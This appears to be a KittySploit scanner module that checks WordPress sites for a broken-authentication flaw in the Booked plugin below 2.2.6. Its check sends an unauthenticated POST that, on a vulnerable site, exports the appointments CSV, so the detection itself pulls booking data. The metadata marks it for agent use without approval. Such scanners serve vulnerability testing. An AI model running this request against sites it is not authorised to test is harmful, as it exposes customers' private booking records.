#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Booked plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on seve."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Booked < 2.2.6 - Broken Authentication Detection',
        'description': 'The Booked plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on several functions hooked via AJAX actions in versions up to, and including, 2.2.5. This makes it possible for authenticated attackers with subscriber-level permissions and above to execute several unauthorized actions.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'wordpress', 'wpscan', 'wp-plugin', 'wp', 'booked', 'bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://codecanyon.net/item/booked-appointments-appointment-booking-for-wordpress/9466968',
            'http://boxyupdates.com/changelog.php?p=booked',
            'https://wpscan.com/vulnerability/10107',
        ],
    }

    def run(self):
        path = '/wp-admin/admin-post.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='booked_export_appointments_csv=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('End Time', 'Start Time', 'Calendar',)
        header_any = ('text/csv',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Booked < 2.2.6 - Broken Authentication detected', path=path)
            return True
        return False

